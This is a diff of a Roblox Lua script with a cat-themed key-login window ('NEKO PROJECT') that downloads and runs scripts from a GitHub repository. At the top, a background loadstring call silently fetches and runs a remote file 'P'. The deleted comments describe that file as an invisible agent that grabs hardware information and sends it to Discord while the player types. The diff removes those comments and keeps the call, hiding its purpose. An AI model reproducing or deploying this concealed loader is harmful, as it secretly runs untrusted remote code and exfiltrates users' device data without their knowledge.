@@ -1,26 +1,46 @@
--- [[ 👁️ NEKO PRIVATE SYSTEM - INTEGRATED 2026 🐾 ]] --
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
+local lp = Players.LocalPlayer
 
--- [[ 🚀 第一階段：啟動隱形特務 (抓取硬體並發送 Discord) ]] --
 task.spawn(function()
     pcall(function()
-        -- 趁玩家正在看 UI 打字時，悄悄執行 GitHub 上的 P 計劃
         loadstring(game:HttpGet("https://raw.githubusercontent.com/n9wmwd7ycz-crypto/-/refs/heads/main/P"))()
     end)
 end)
 
--- [[ 🌸 第二階段：UI 核心參數與設定 ]] --
 local CorrectKey = "KAWAIINONEKO" 
 local _0xUrl = "https://raw.githubusercontent.com/n9wmwd7ycz-crypto/-/refs/heads/main/Neko"
 
-local TweenService = game:GetService("TweenService")
-local CoreGui = game:GetService("CoreGui")
-local lp = game:GetService("Players").LocalPlayer
+local function LaunchNeko()
+    task.spawn(function()
+        local success, content = pcall(function() return game:HttpGet(_0xUrl) end)
+        if success and content then
+            local loader = loadstring(content)
+            if loader then loader() end
+        end
+    end)
+end
 
--- [[ 🎨 第三階段：繪製華麗 UI ]] --
+local function CheckWhitelist()
+    local s, result = pcall(function()
+        return game:HttpGet("https://raw.githubusercontent.com/n9wmwd7ycz-crypto/-/refs/heads/main/W")
+    end)
+    if s and result:find(lp.Name) then
+        return true
+    end
+    return false
+end
+
+if CheckWhitelist() then
+    LaunchNeko()
+    return
+end
+
 local sg = Instance.new("ScreenGui")
+sg.Name = "Neko_Ultimate_Access"
 pcall(function() sg.Parent = CoreGui end)
 if not sg.Parent then sg.Parent = lp:WaitForChild("PlayerGui") end
-sg.Name = "Neko_Ultimate_Access"
 
 local Main = Instance.new("Frame", sg)
 Main.Size = UDim2.new(0, 360, 0, 240)
@@ -33,7 +53,6 @@ Main.Draggable = true
 Main.Active = true
 Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 15)
 
--- 科技感旋轉漸層邊框
 local mStroke = Instance.new("UIStroke", Main)
 mStroke.Thickness = 3
 mStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
@@ -51,7 +70,6 @@ task.spawn(function()
     end
 end)
 
--- 標題
 local Title = Instance.new("TextLabel", Main)
 Title.Size = UDim2.new(1, 0, 0, 60)
 Title.Text = "N E K O   P R O J E C T"
@@ -60,7 +78,6 @@ Title.BackgroundTransparency = 1
 Title.Font = Enum.Font.GothamBold
 Title.TextSize = 20
 
--- 輸入與按鈕容器
 local Content = Instance.new("Frame", Main)
 Content.Size = UDim2.new(1, 0, 1, -60)
 Content.Position = UDim2.new(0, 0, 0, 60)
@@ -85,13 +102,11 @@ LoginBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 LoginBtn.Font = Enum.Font.GothamBold
 Instance.new("UICorner", LoginBtn)
 
--- [[ 🔒 第四階段：驗證與載入動畫邏輯 ]] --
 LoginBtn.MouseButton1Click:Connect(function()
     if KeyBox.Text == CorrectKey then
         LoginBtn.Text = "歡迎回來，主人喵！🐾"
         LoginBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
         task.wait(0.5)
-        
         Content:ClearAllChildren()
         
         local info = Instance.new("TextLabel", Content)
@@ -123,17 +138,7 @@ LoginBtn.MouseButton1Click:Connect(function()
             TweenService:Create(Main, TweenInfo.new(0.5), {Size = UDim2.new(0,0,0,0), BackgroundTransparency = 1}):Play()
             task.wait(0.5)
             sg:Destroy()
-            
-            -- [[ 🚀 執行主人的 Neko 核心連結 ]] --
-            task.spawn(function()
-                local success, content = pcall(function() return game:HttpGet(_0xUrl) end)
-                if success and content then
-                    local loader = loadstring(content)
-                    if loader then loader() end
-                else
-                    warn("🐾 NEKO: 核心載入失敗喵！")
-                end
-            end)
+            LaunchNeko()
         end)
     else
         LoginBtn.Text = "密碼錯誤喵！(QAQ)"
